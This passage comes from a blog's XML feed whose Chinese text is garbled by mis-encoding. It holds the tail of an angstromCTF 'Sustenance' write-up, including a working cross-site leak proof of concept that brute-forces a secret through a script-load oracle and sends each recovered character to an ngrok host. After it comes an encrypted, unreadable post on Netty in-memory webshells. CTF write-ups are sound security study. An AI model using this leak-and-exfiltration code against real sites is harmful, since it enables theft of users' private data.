list</code>æ”¶å½•çš„åŸŸåï¼Œå¦åˆ™ä¸¤ä¸ªåŒçº§çš„å­åŸŸå<code>https://sustenance.web.actf.co/</code>, <code>https://no-flags.web.actf.co/</code>è‚¯å®šæ˜¯samesiteçš„ï¼</p><p>æ‰€ä»¥æœ€åæˆ‘é€šè¿‡æŠŠè‡ªå·±çš„ä¸¤ä¸ªpocéƒ¨ç½²åˆ°no-flagsçš„æœåŠ¡å™¨ä¸Šå»ï¼ŒæˆåŠŸæ‹¿åˆ°äº†flag ğŸ˜‰.<br>poc.html</p><pre><code class="html">&lt;body&gt;    &lt;iframe src=&quot;https://deelay.me/999999/http://example.com&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;script&gt;    async function sleep(ms) {        return new Promise(resolve =&gt; setTimeout(resolve, ms));    }    async function search(url) {        return await new Promise((resolve, reject) =&gt; {            let script = document.createElement(&quot;script&quot;);            script.src = url;            script.onload = resolve;            script.onerror = reject;            document.body.appendChild(script);        })    }    async function oracle(url) {        try {            await search(url);            return true;        } catch (err) {            return false;        }    }    async function exploit() {        let windows = []        for (let i = 1; i &lt;= 5; i++) {            temp = window.open(`./csrf.html?${i}`)            await sleep(50);            windows.push(temp)        }        await sleep(3000)        for (let x of windows) {            x.close()        }        let flag = &quot;ctf{yummy_sustenanc&quot;        while (!flag.endsWith(&quot;}&quot;)) {            for (let ch of &quot;{}_abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;) {                let url = &quot;https://sustenance.web.actf.co/q?q=a&quot; + flag + ch;                let result = await oracle(url);                if (!result) {                    flag += ch;                    fetch(`https://8a1e-82-157-177-169.ngrok.io/?${encodeURIComponent(flag)}`, { mode: &#39;no-cors&#39; })                    break                }            }        }     }    exploit();&lt;/script&gt;</code></pre><p>csrf.htmlåŒä¸Šã€‚å½“ç„¶ï¼Œæœ€åè¿™ä¸ªéƒ¨ç½²åˆ°å…¶ä»–é¢˜ç›®ä¸Šçš„åšæ³•ä¹Ÿä¸éœ€è¦ç»™cookieåŠ ä¸Š<code>samesite=None</code>äº†ï¼Œä¸è¿‡ä¸å½±å“è§£é¢˜ã€‚</p><p>å½“ç„¶èµ›åçœ‹åˆ°Water Paddler çš„é˜Ÿå‹huliæœ‰cache probing çš„åšæ³•ï¼Œè†œä¸€æ‰‹ã€‚<a href="https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722" target="_blank" rel="noopener">https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722</a></p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ€»çš„æ¥è¯´ï¼ŒangstormCTF ä½œä¸ºä¸€ä¸ªé¢å‘é«˜ä¸­ç”Ÿçš„CTFçœŸçš„éå¸¸ä¸é”™ã€‚é¢˜ç›®è´¨é‡å¯ä»¥ï¼Œæ¢¯åº¦åˆç†ï¼Œä¹Ÿæœ‰å¦‚<code>cliche</code>,<code>Sustenance</code>è¿™ç§å€¼å¾—èŠ±æ—¶é—´å»æ€è€ƒçš„é¢˜ç›®ã€‚æ— æ€ªå…¶CTFtimeè¯„åˆ†è¿™ä¹ˆé«˜äº†ã€‚å¦å¤–js webé¢˜å¯¹æˆ‘è€Œè¨€ä»å„ç§è§’åº¦æ¥è¯´éƒ½æ˜¯çœŸçš„å¯¹èƒƒå£ :) </p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netty å†…å­˜é©¬çš„ä¸€ç§æ€è·¯</title>
      <link href="2022/04/05/Netty-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF/"/>
      <url>2022/04/05/Netty-%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0d4d98334e51e518b2095363a117f7c789c04a4e4e4cfc41c38c26f8976b9e4f">9358c88f4b5c6a573c900e987a191f441b008625a66b49de74e2b50aa15f8205544fb3e1a3cef9e8e8eba87d91f78f38ca5cadf9531adbf1c6a568278c93c40d084ee7642617ff40a5c18a6a5ac127a53543e3c1df96964a92d874405f2388f2bb7ea308ca010bef3b6d1fe27843b57aca01292884825226132a9d97236aba5316370e9e2d0d65a959b9fb2d7037b8174d81f649226c15494cfae0b2b4d322d3a65bcc1a7798d9c353bf710f60bdde3b7932d347d77436c44d0063ebffe5dcf66fb5441ee06742bb2cb6a89af0d6a74df72e980093f71c8122e016c4045008bcb4cbce626e981138206508fc3c4e040633258d8cb4d7fa0dbd826d4fa177a16534bb74090f43fef5968d9fd90dce988c7fb44f7edfb84af41eca088407966756a68c5f34aa83021238cc56e9fa364359a6cb402c558be540a7c7c3390cbc0ee3336ccae3151dd281329e09ae01f7e3ae2010a27f9a0a449f17e6bfc0d497ab2f92a0159ecb341fc7422c134bce83373236a3002a9967c5341890cfca233249de005d7404b64991a634fb79d54364d2e0b42636c90c68c6a6b8aebe88535a837d984f6b0b7bbb699a896fca90535490a58c46e64a5c882651be170ff537beeb75be32a73b39616698aabae70fd5031b0825562de1ff9a94a0378bddf153e82f6caee13480c20601c47c1128d909c3e693741bdd8a1ed4b992a6039f8ea6e7c006b1adf81f84b0e4b1ff0dcc22791aa140796ca4b5649dd6ebc1b6a5a757154eb01c6799b22728141d11333a80ed838afa37c6488b868ad99b1040315fab418506cdec242a6c87b7399719cc9f847c225eb30eb9c3e619726576f37482508f9290a23ed8c460acf5401985912b693b4a2288f74844a0935731a6414a3f6a5c880f8bc9364b66d7fc372d7f1736d8959c6af73510282b0bd2dcb82b44049a175dc5656261ece3f9e9c80b93b00d7ec7a02e42f40a5bae7cfb0892b0a9fb3c33786427a6b17191d29fbbe619b1664bd17d21aaa7c7aa0f6de01bb1afecb30bd1aea67f27fbf7188fa7b01c9eee00be70c31b5b4482172ba3de0019a6a3ca7786debd182e22beb1de25fcce72c6025fa42fe4de96a1b96c754e2a475aa9592392b1d59ddda0aafae514b84acf44c74a9955897a44a3d038e078d6c195d89b560eff52766916657bc3d51d2b226b0503d7a5451839a5d3e10684b419c6c2547bbe29b4dc09a4b1d6c906ea87f8a7b03c3ea9b46475fcb70acf0a06c72aef6bd6e6fc37072207be8ef9e284a48a472b5dcca52c20875ade4afe7b4a99636ec19e8eb074d126b8bd8454c7a29880293fcd789bc8622485b8e274b24497cf005f9cd471178be823b4c4eefa532b4052680ecb8fbaa0f8429817ccf8e82e8564c7ec2422ad349963ea1365f41b7aad05abd6b1c45aa2274f5918290b0593e44c4fe6c55172059951687eceb34a701144916b8f9caddde0598e24f902eff16201b82ee76daaff8bd0211516ed490fd723b2fd30e93143ee423157a0375f9fbc076b258885438462636be8ccfdedb085bebb6cca95602d21957996d1120a6166bfc4116d5ff9f673b58cf785d495e819e93d8718630ffcf1fb47299655326ad026e2ace86605e7a370ea20f6d0f446416ed01901d8c6964e35aa942d51a828a142fbac8654067804f6c70004e5cc8575a154ee947a49603696d6f9558565566e7b827b86f5553d16a85dd2d6b205654552a3fd5680a5b1476915a98cc8893432b976ff40d0d4517f5eafcac0b9cdcdab383a7f4564f8ddd378abc22da50aa290ce65fff5a742e00af593f82329e461d917f597579edf6aa5335599d1bab6e63f6cc50d92908a40b6b965d2544265e16d841b7339aa65fb6d57c1d35e63210a8e63137be2a32634b998ea37e3ed4d387d372b3a40689959417b989d2b71f8ef4c66945dd68a662a6a0bf7cf967755a7dba1c7aeb62e84e99deace5dda9eec690277de4ffc5c1549898a10d571873364b345c181e8c1801343934739ee220255cc306be4aa822bbcf831c70f287508210fe6d12c8ca993861c323af788aa9114fc2880a8c79abf50ea32f014ec899ce2659e82296ee02654bd27a6a71c4c15b324af53c43b2b0c8a67507124d271258d0d13f1600f26ecceab34dc8815537095eb38057019ebf84889ad8657f68dc3712f809186836521bd7e43a188e90b0775d8c05150e552be008cb786f2f456226796351350445bb318cbfdfe497eb49ff87a2e83a3cdfadfdb84d704ec716cd7d18965749fc6f8666c61bf429c2edb3dee6f853dd01b872a9b99521829af85b1b0c76f9444ad6da6665a715c9f379a9a58dddc7b39dc38692839108ee22f607489342ab99db03912ff82681b4e1d18b8021b54f1e27d2961ca88f5b917dfe26175247a8d20bb3e1592c312ef6e67d764475ac83140f68d33b595b4e0f84f11d854ec8bb376fb8a8ce8cf6876761fc20e814eab295afb44853dc6af569ba4304d38649612c3833ada18020d35b83bc1f996a22ced678f8b07cbb59a7a48b7b7e5ba8d069b43879976de7413923b95fc43e7829e13f40efbe1fc6e0eb93baa0463ecce44fa9f3c9b78f82b8ba0ec184f75eb7a33c3d8394f464627fff5981a6f8e1db5e90b267f72544093f7bba33146a03a9cd50ab6d6271398a11fc7f7921d9d6a7f0074917f6e32eed8e3d2c06ea229b552ae1bf21135bb16cb0157a81fca1e8c8fc697bfac9edd33739cb2b7484292e511bf09455e79d1879b42cb4bed33820bb0982618dd32e95da7b2d25d932f926ca8bf4c8938b8f3459ecc54c93868a6abe0f94641a9ee9da77ec355a9147e5bddaef2d0fdc447b5ad961e28b75497f5ce959f75091e0a377dfa0dc328d65b10b73717016cdc9aeed86c57a6db2d752d1cddb8ff545e2c463be15faf8533f6b14b6556d8efbdb3b256267e69743609b55654f8a3c958c67060b9209d609143f07bccb09c6c03f3bfe9b1d575d31554bc4587c90c34c1f73a9940430f2250052699a038d790892b62533523ba55867cfeaf335be44e40a6c3b5d205dfd764854dbfde2d06a3bd3d59ee2535ff97f00c8e5395635bea2384add4f87df6151c6f8f7f765f498db26e343f3f2ff403987b8f7dd8f67b14379703569537919cb80c8903b4c45fd5f875252adbc247816fd1faef8dc7980eb25447e31739a09dda57417fcee63f947d3c04a911695ac1161e07818602abdf0855dbb98d915080f23869b4b50937960eb780f2b1dacd1c8010971cbaf8af57859295257c0898cd78956335a4db4046a84601629a998fec8e42a638a8ffded94d91a336c7544a09da935b79c8ff8748bd47bbda744677617483ef68d9274927b46cdabbb77fa75249bce42312b0d2948a328bf308135605739bdbcd4665668cfed77a95ac9a83c0de4509e360cfbcc7ca0cda8b3fd90596bf3d7bd1f1a6b69117bdf42fea42f920f400f5e793da977ebaae5fb5ec6c0e57a44507955116961361093c5cba58d3aec7656ab20de4f242346c00b42bce62fadec00f387d3b920303079d108846e1529442d2e43bde5232b990e1e110e4cd988569f9d3eef200b82d1a1c86edca783907c9d3b38308b248549acef7523a3f0e4af0cbb23fefb00a7d1f94026752ccfdebf2358fa869efab7fd78d3bdf1351ec4eb11c4ddb48e41c54875a50c346392a4467067e600889e31f7c815fd32666313e9427813a544360cabea04a4f75c377982914ccdb5bc515770e0021ea02c532398ed57231dbb16fe9f22ffdeba483323d21a285a688809a5644e9577fb063a31ae58ee8b2d42f00335657c02eebeb99099003c769bb3686eb1ccb89eb19785e7b2543936d283e69b79ddc85d7ee1bef448e52c7438784de98df5d7208643a94fc87ba233d1517583b487c70f0dc2a759242e29dbb02e291a1b864f0a31bd6b2b0cbbecdc79c1f7a354e5ea90f56e22d46891c5bde0f2df9ddd433a9fe7f32a08b0d76af5ca21a357205a7839d600ef5c3a581889a1af5d66c984c48908aa359c6249cb5f1dd0193eca9ccbf81258d63fb610a543c59d8f0c9cf13fe3e6f0098b78ce8042a5d58939e93814bde1db7eb5bc833efe4e8c6384b14b22194f7d92a99d35d35801c2518721c2dfa3728a354b513f197f6b3dd3f21e90df6f3ae11cce6cd727131e752128a2c49705acb5f8a35369fc2dee2485ba6581bb121d0a6dea0a5b72a746aa5359cfc559ebd752e2e943b9037b490aab2c22319b272716504ea9122c7ac25c466389e524acffe5246565f108083f6dc26c2eee066cd7dfdedda6be9e0dd8a5ec287ee6d8f99d6ed5e49c75695bbf4a481431c82b19c347f568ff5e0c661b94c8bf941ca9e43665a385291ea16da1c278ccdcb0e086c97df72ef2ce9c9c3fbd40e9c9fdd8477781f52e91648c82c8922ded786030b3bbc9f3cf28512a4bcdf49c91895164bae433c7fa40933719ca1e7e163254a6f92a3ec28661a36d13a4a7165b2f41b89246229227f085d9120ece44d48dfa00a099fb7992f5e1d29432e93094e5ac0af7b7b2a386b6a3f74aaace7875f459d66283ed66af55039c06040a1d0afbc107693f2d7cec8ef2f7061328de7e9e05acdeadde5738127012aa9243dcb7823dd9100c0cdbd0771cde5ef68fe376d5b345cae6c10e791470edc2b052b5b510acdd9dd5ce171b50d00e4267e2f746d4f9ab20661c4dbf810c6a273c8f31bf2abc07a49fa7b00d0e9735c149ab0f6d4b4079264c48bcde2c780b57190a9c12d733fdbf8d9ab5747f2023c7576574b9ce1c3889cc4be91716c85af2e22a1d44139f74f57965cc85d53a6360e8675c89a65dabf4aa1f6f5f0bb009198890cb6e596ceabe9753774c79d6a05a8d846bd99b0e786334346973ffb8751f661da3d2dc730ca580741897f4e72e9463b8e8216904969f9b10336d9fe07855949c61b79f086ca7341f5878ce4b106da404a28be740e4e024318c05fac95bf0b35b365891ca7874af35710240d8b367767c7231264d21a23aa7f92386442fbce5b87ec15d916a1901b236f2cd8254b3f0c8d169fc9a5068aed3261aa8ce6987fca792d659418a62e439f21359098654aa5486da1c77acda0fa7e781c770f2d777841c5a1e86c4a71a2ca22846e3c77168ddf7902d807e1bb6de3f7f857ea5cda797eac6ae29443cee34ce23b32557aafbe98ac5f005bd0d0f60745e370d71a4b6af425db4c739db4f294bb0b116849b68d8c298272cc9c4a6dd04f152d49674ed994aa4b42da0a2cc3707069ca5784340c2d660b6bc4d0603a1057d42d05d6c513dbd5662f6f6e5cbe578b768a571c95a418a9d020458ce491fc02c23d855569056c94bd5760f36abcc2961a02971b954479ed33e7531059e3907ddd1bce14d6bf0de3685b4400345c1061a18e51788c83b1ed4148b42188916ab9e557e8d503accf117df8f3b598e9fb75f5644429f15e0363187cc17c63d613b02cea84ceb19966ae0c66abedb9b15d42a799fda1377684bb016540ba42d42cfe810b18a7ba7323a47fdccda66b1e1610db0b4f6f74655e0d1546a38a21886407bc585dfa97a9aff2ac6b1aa55b1bceae2f16b9da05af6f50b8ca464804928708c3903529481502dd5ff0f5163a9a17b30a6ffb2811c9df984ac55d9be7c73fa31640dd4b1503879632d47a041869b2192bc8af0d45c67de38d899f2ce3d8251c3750ed7adfa1079c525b3e942ee8ea018042ce9f335662acc8b6ff90aadd20aa3f0259fc8f1c915b7900ba901efeaa32fe389273b6376f39b0bdc68daab0ad7f12a1968b9181bbd16ebf8a6d1c6a735a1a567f46f8b86545f705cf208953debd05f5f93ae4adfca34cd66fcf10e62c53fbfa9075bafc1ce7448c07f26826f6aba3874fbd8b9557b432402f0fb6556b53ee3b51be31565e642e45349cbc362c8f20f3a6950ed53d51ea6c8a123981f3626d10e23be10c081bfda7dcc45ae02d6d267d549d1ca3e64958d1440f4ff04440ebfee7c8ebe419793af10ed05d53e0f9d23c8f16d956d4efaf56d398f4129aee905adfa6a6a6ce0fa4305bcc1775b69d48da72d5bb92dcbc83160a23b9b67a3debafcc3419622c4aca26b45727fadb5a5724d50eeca1843c31f03e35463d7ba96280af06b87e1b7ed339529271ca8c0f635f4db074695e5d9af6078a3a8d66339efed7c8fc3daecfb7755dcb91cfdfd92e83e26b325cac85bad101a17e6e6c2d9059165c89454632f80aa75d961faae8a7cd82e8bcbec50576a6393c7ffe3eec6c67ae41bcf7e7b814c40ded99df07dcac712cdbaa8d0c6ad6591d43dac8f204c96f22e4750305a691c2c021640d67b0e5332bc041d120526c8d0d44832583f5c67b8a9fd87d45ad0be4a1a6da23662a3586703a9c1bb25c1633c366b9f91dfb8dd569fa535da5dff7a340d0aadffecb9285a000680a94851f63f092d217922ab2a4a3b95e9b662dc056e2239123280a9ba2ee111550bc9d70d704eaa1ea9a7699a3626243b110f0e723868e5aae40b66b15845cacd4be3aaa20aa2122214907c7a9aa1e20a9bfee43c0fad458f46b3ee33490fa0f4b608a52526a8a28cb23a806dddcbc94f42ae0d86e52692580191943042a8b2c6ad3c780636e0ce5318162aff7dc729c3d8eab0717e8e2c3f6a5c8418fafd29087d6a7ba3c353e9625cd035a928ca1abd9bd18500b65184306bf8bf21e209408cb3d16796adb40321434e67f82be4b66246200f3f5cd2bbaf4871d732f03681ebc4e638a8ba6f3d911948d74253910494af946e2ea6d1e7b085709e22601dda7dda7fd9137e749fc54d1dbb1cd52a16d6ade7a1ffcc63d4ac4766eeab4ce23cbf52a407ca2eb553e465ac0f483198f095f4a0b488dcc93955a543fab83bedf201d4e483a3e20b4be14f7e1eeedb629661b0fbc8fd27668309f6be606b3d6cffe6e4a40151962d88def810534575d550e6c1f33767c15e2eb45e96c95671de8c32a4c915255598abbb90858aef1a9713446d4db534b31522e07e229952d67d90b656b4f86b1dd0f62c7ebdd2ecb1b09e717aa3ae00de9f00438bdccc95512cf1649db1a141767fa26b44ca6b672f4707041eff6a2d83148bed6ef54ba87058ad8c683b2d38503ff06c24c47c68d2b6668dcba0cfea58bf68c49b164260e74e5f7bd8636ebe25653ce3d255a68c19466bfdac5d2f57d39a1068d8f68049f3a0a0f6dc76e04e2420d709c61cfaeb378d57f542bbedb44a93f2eb74005bb3a471fbb55253386389ccbe75fe06d125a7a6aed9f8ad38bd048eb7c2155ad70c2a1278c373f9f806db12a8a4f3dedc03bca03bb939d9107fa34b4600a8d7cbc2bf40b948f43ff4a3abee7b21de2814aa65c4cff577fbffcb309044e9a765a44c94f99144034d43194b58f32eca8a3224ba41e4689df4e00f651334ee6c4233d9a30a38e78ed5903817472ac4d219d785d6486e48a5bd1d504b8b309301b2b56ac7552a7df77851db9c7ff0daf79e994c83507d8dd8e0d089415771934306fc4e1a1d2430e736dd8e98efe58373f6b8231b15dac618fdac31e4833bb335adadfc5a20487d63b7844dd51e2260829714397afc3e43b3597460d036d867304488a4462099c535fdf136a007745b51b3ee8f39d1359316df766d96cd60e721f2b0d83c738a8a814f06f9397f54d5191d73eb61b9fd20efa865899be84b8f341a08f9ceffc09f4f46bf06c7791707155049f6eef492aa67893c80ec2632b87d3388284103fde50954e232b4169feaf725aed6063fb04522e5f5f0e5b54e5221510ee603a181b86111c15e6b3ea6cbbdb80c6b6ac7263ed34782107722139849b0c905b33d3d7fc819ff2c5ed68f82f56432572c193fb370fbed543e0c6e44f3316d8ad6c3d8f64e8e9d95cb13ec4224a26bb3077777672e4b2b2e12d08f3c719778c3501e517ec12519e6b4a1cc48e3bdfec54895fc6f7dfc0e9f021462a3738478f9cc8223d2fa7b93753776e6403e48acc2381c9c675ea9e44d56e138fafa930aaef16e0e5458e67293578557f38fdffa8731232bd1c37fb8bedf58e8a28f7f7ea2ff3846e1f49ce9c1b099324ca3f2a82e72b4d766f97554f9a2c259231e6d3445764538058c394f4cae5f0459587e60538e3bc7166aa69af4ec54d0484a66bd892ac016aec2f61894cb0b80e8baf1348074c47a78c6541cc57f06651a5ab2bb7df6266d3269812c9a27bc7acbdbc380b093e0981fda8a0a8588f9e6b69f9cc7655f62226a80a61a92845ae426de34ca03dbbde651b0dbe07c2149ff651055af9ee024c1625fc46047bb8564621ab711923ad1e45d421e7f3bf9345e315fafc3839af9ea505d7866e44f5208bcdbe27b23820882f66e60193d555f3a5eb6e15c0eb3d6e6fd8f55a9d2b5e1f4f2de47c2b469e5ae739174e9c74cf2c3b1a6f0157eb458c2d3cc8135495830157bbbbaeb49f6431d0f459978a361fbc0668aec67978ac25de9ceeff44509fcb3cb1f06850d2612c7dea5b61fad182cd46048b8b7cbd07f0c4d9ef47d987ac44d4f8ce76daf76a6bf8367c8d9a233ae5a618f068badf808ffc7c52d2408b501348ab2120e7d1acf3094d04ca30f4bcb25b565959a0c4890b0c20d4b18e055de1b87cebd611b0e058efe99c9bb5e940b6aaf5f3e15f56203341b7e62268c1bca57fa37277c37eb2af3881c1ae68f02d1fbcd2a8e33c25fd4d960378317db492981d464903a6043bc8455ed93f63b4ebb9d384e6fc9ed8955b6eed9aa7456ac463f757a5e2f5d05f9b0a979dd29d6a21d0cb3a7ae4a45a6107066de972d0282c44fa8eb3422763ed73d93882f12da1b06a1c96aec6c632cdc6c53853daa3b6dd2fe1b2086e819a90ba6936b7ea3b9cc4ce63dd248fa282449e2a043732c4a9f23b49d9c0bcfde39f87c226f6f78a8f56bfb387969356a035c4c83a1cd5c252529b954c7a8d0b8e4b390a344418aba369a19287dd10de2d7586dc26b8ba3aaa91984889f3da34c6c9d81893bd58c973bc497dada202c4233599241bdf1e54159f5964890b6aa1ce88aa36eec9d79fbf63242310655289e75bcde02033641d9900da17c833be4f27521ee1a36d89cd6b23f41961a85267e858b712d5b2c617435cb3a42b93585f5127c49880b41eb59c12f69c79880c5eda43109225b4b888f5f60078f62c43bfa3c32687a4941f5cdeeaf4f94f46df986b59f7c2684aaa698fdfde747b960d67c1e38b8b1ac2847c92c14a37b84018c9767e118660b747dc71b75055288f3c25fd38ebfcbb3f8d906e92519a1ae8b5b2cb187442f265c39a4180b692d94751c26803715957bd3930f3d787b6a2d01f7668318cf5b90961b8302e6a697831c39fc887f3173673013e11555d3c77d2c38639e7c9c634536c4fa8898b49a1758c78d35376b1cc95b9d6db283f89f707112ba034d8a773f732955eed253a2cc5304a74f141006323db9bfe306938501e91046bfa103e6f8c6f903b0ebd20f4dcb6dfe117313d37663fd45528d2ca220d9ab8e942bcaf6272b70de4d83e79b9e70eb4831389cd6a889a47094f64d27f00cec6540f23f99af371f4adaae732c466f4d38191041d26c51ddca8dfff7627f461151895b5c235a2511bc51133b0ef6df66af741a3b6e472f6885f009ce738023a4f10ef52b0553b30cd0761fe25804ca8ad801c04cc3e76abc0cddc804308537ca709aba46d40c48ceaff7590fce668cc225aee6348f171b485b2fccb398baa41f7e0eb45ae97f8de76c190a534571c1461ac2dbb2770d86c4a88e55d1bba8c1dd94f25ab4d63c815f364ccf6bdf800feac197c19e715b97265a7e5219de04a983d905ab2572486ed714629b28bab0c21ef2381c1004e83b1fbd6b009d4532e152d519a5987f7d3196fdd63b569d019444b465fa5549808eae8724d080e787a0c0d8d6a7ccedc65d907eee5393b57394f8b398c994369a3905743d93839917309067c2c706e00b8e54e8ea86f21469001504fd42695b63ebf9fd79e0739aa1a36b80bcc73affdf0ab4caf1419310bd81302146f063008082fe0c6ec67070f01782f2523dbb4eb993d21f1e9acb30a043dd6e8e6b9347865016ebe34d6062c08d90316f4027444f18b4a503e515d64df61a0a39938c313e94fe3891c2df43d1b0db2b102f9db7d26380926ae626fe616f51527373eff66ed97b874838247e1ecb00f7c5d6c849f808139b6205470822beab7959230538713ac92d50f67048d4ae5f8bf791605fc417cc525fef6094ca3d50930a79ec45267a3824c99787f36157629c69ad4ebf987cfe044eb0528cf727b429054b1976cb8a6a421bb33e0812af2d2dfef9330cad6b4aaafad2875eb4e57cb48ed89b7b68f72b3fc601fa39d9de837fa7a3493349f65ea99a8ef0773a19b774e569323afb5327b4ff28637d758debce9bc0d35b2cda79ffde64cf8a2b21fd4c2e6bd7f236e7a8b8d041f2e7d3deb546b6e443453a0eec338e77942effe69d6a2a64fa0ac69fbf45cae6de8459268bfd0be9c116723bc2c0fbfb91e51830b8cbabf8e41d68aedff9af1806a9d79ac7a0264b58987848fc0658ccaa4d37f22cd9914e4a3d15e743380fb506585d23d4e20f9ae5ddbf074e04b927381d1a329d85decbddbf4a4138e8653a5f5228335da4784a2f3d111a96294baf0a777ddf0db86004278d86567a5c335db4e2f974cd9b6a32f34e30c72eb564da8e09483529535f8ab0624c65424dc62f8ebf20ceb5efd6087cae2c210fef45353304862eeef0e23d5caeae0bb04d1edc7c5f4d7f79e227ddbbe30a3322c6c677f32c79870516c9f227f65b3c6bc2235f6281856e409c56fa03381262765e83b221f88d7ea80db5f1146d0e67377799aab97de466fbdda6e14b15bf4056bd9770751f984af131fa5d4bfd7e5ab83c2fbb4e9e0ac8b249819a452e4138ae3aac580469435420277c2fff7819a0df235560f6ba5bf6564e9b793f181738d7d656e2f058904eb48528ab414d6695acce9019348221b565cf22a20d7209f4e149f7c5dce7e299808673a2183d19c85f05a168eff19a6766ff3f6747647203270afbc6d8e52b9c0787c4eafcaf9574f55d03727c5f7f6288e532505daa0f11329ae034635b6eaa8c91e375423dd88637aeb5aa567bff0ca980b566d0fecc09f392c4982908b93450081f3fd8afabc602c6756ec72989b6e66b8ee028b880e00e7625b297a6e8e8b780138c4d2cfdb806b371f4ff286f2f1e75ed08499ab4eb427063fd8187f87dee6487f4aad63f0f23214bcf09f95579c2450154cc46c70168ed72216c81c6efffb6930706d08a4835dbbb145695b665c855fe9806b9cd384a79611160a746d0ab89f04b4fafa5e68a4121eadddbe9a75a236028a6836dea587bc42fe227ba1b95ff5fd9ec85e053e615d3f320bbc9c827e47f2273092bf454ec1295040d0fc01268be6d22ca1372e6701a1c0a12422f975e2c655a6ba92b604f39a6b908b29673c9325458721e2d0a34a0a4a072bd2f25d1eaede1375eba3ccd9e5b2abb702d5a0b3a745a3ac1adedb01b8fd644e2199e473b9a3fdeefc98eb1fe64649d5a0b79e9515163d7b423d19fcfd2d3d0fe6db3971c5a6823adf3b800d42a6554d40a5faf638a7a5714469ef0a3c6c844c8fd7052f06f68ca81a5469c4ca5d79330003b77c54b622e866e76deb0b2ff9f68c523e4161552609e204fd66033651c68cb32cbaa3ac7b4279e1d2a045f88f7beb270d4867a7485a51d90164f39487c0cc438fc724cca6b89ecbe67f61887a1d937cde85c88c17f747d2f3508a849093bc69978c6506a3127656ce694dce093643e2c1ec58b86cb6c4ff7de8463564f0a5aef5a6f54cff72de1d8d636d68e8525f515a09765a9b1f1afa2364f0ba578b1e0f4de9465c56b717c69853cf49db9233df49ea502d56e06536caa3457bfe31929d3c7d16d0ea84d9531fc76f5ab90862a6fbfe1b1624499aff249d0bbc5b7f2c975d5265a4ee07c9868a2ecdfb4ca75b7d79edf241ba20179a0dec27af88a34ec2d5d0bcef00ae7b658aedd7047aae4b73e71f4b74a1317a0a5b04eefefd97a079cd055b3bdeeb6dd6deb7e66135b9fa404ee323c0a9124f89a6a3fc6a7ab1fd27667c0d1c12ecc525e59345295b4e68c5112f4e36123b30e204580573b58329d07e66398ba9bfbd80b2c6e81a94bb159fe876a3f51531a173b7e003f342ce5075a251010d6ff37e3d16e0dd9a67a091e7c9e4be53487dfc66faed61860eb685f7a265f13a5a0720ccc07f12dd9f11ab99b6c18b9614155c3c2e7f336b34841750853f37af6df98a58c78c24606d0c3458c5d79fdab46a5db1d57c13b8f6a980bcd4ac282fa43add40c995348b8703158f19b6a876b60ff98984a755e9a8f9f6a787954cf667d451dfa2c8041ff0bb5d6cacb069f41df594b2112698869b206f64ec4103aa19229e5600614856877ed07509203d17aca41dc6cd3e99b2099a7a0cffa81123797543b6905bba6bca9bce80d520eb46b83782b14c8e91b5e62a6324bcf25240f7800207bf60de8a5ae5d9bdf6f5d51cbf72d70d8f09db39153bcd33317b1fa8551d023c114802c11c8b6685c285d4c0858c17d0a3ac022fa4e7895a8e9a5fb9e7f025e30a878253e7fe2dde1b37d2086611d983dacb0dc486756a559f0e70505b4553551ce9a4a36799081bbf41268a882809589eb5e78a2fbe32dfa08545697125a8cd8d1e0370b71e7d3ee641983130aa2f7d7429a0577f82b20f03a738fc366103a303916df53457038d3a7cdca138ffe370c136fa966ea9c97e381f4ad535399c66c6ca02806bcce4baa7e02f61d0006479174b33e142309057787910f88de7f3e775833912d581f195bcb0070eca17f5eaefae5917dda5597d234ddea8917aaf1c94ae01b5ebe36b0f409b443fcebe54cdd28ad40d81002d3c173818d4a21c2314fd6f55a2d45454530edc4c49febefe0bad1c7be25b3e79b9e4aabcc0b85bae2d8f07f993162818b06ecf0a3400c2d3d6a29829c120213d23d62e47d2668fd000637651962db22678f665f99b050a86027997d5bfdba203fbe1c4dedad1e7a45443ccf0494aeb7ad99cef804a8c65ca7ffde0fa9adb6341b42bd07429c576a7d2a1eb5b42c68870ee89e75ba31b9751626323fe66d932235999690a4771f89726616797d84167e37022e8315bf373f4990bffa4896f8ca8d98cc9eb3ea754cdacbbbdb58d2d3b744a6bab267bd8beb7bfffe80158d36c5fbe12c7c5959a1e7221affeb0f8333a2b99cc49bd80ae2eca9dd921d46961b970507d7db3974cccc2967e3b220423c7c07db2d49866db4b2fc74a6f615c76b623832380546c19be9b1a0814967f03a2e5e4289a98c596b8ef6228dd8339c215a7c3e26bc23098ad0f8cfa5e13b18e529e0e01eb0cae1995b681b850dfa524667428fdf1e9e5464dadc876551f6d88376871555f43d59dd0a71c470db8eb201484501db3ade92f894011b7965f7d2a440dc02d5ac48329afcc0d4db54f04aa72128c5ee5b659eb6fde00849f073e6ae5371893e44a65350dbef7081b42ee6c63ccabd666ed2f1bc23f5fa6231ac0cf33ca4885e47e29846c1b10bbec19eca9a4d79eca046fa7dded5b9262875b259910928daf9df3fca827b700d1b10c75dabd2880b1fd341d70f0a1a8b618b0e1a1a58067cf736a34f3f0a134ab0d21c81ab1db3ff3291238011d7aae3db27f49c31fbbf6c87e42c637ff04cd73f0db05e7cb7af7f34f25c5fe3a54d57ca560ff42f9b2e23ff023d9f89574f4ce6f676c11c11dcdae835929ecc3d7a980d00fe63f7fddd621a6fbf35c50a06738af7a93b6c515b06bb12e718e54d4067acfa726d9c4a6e9b2add2b4290eb7b65c76bb645defcaa89a9d1974ebc2403b6007db1368da2d96940dcf3ef880dca3738a297b08d1f4bf710232c9242079037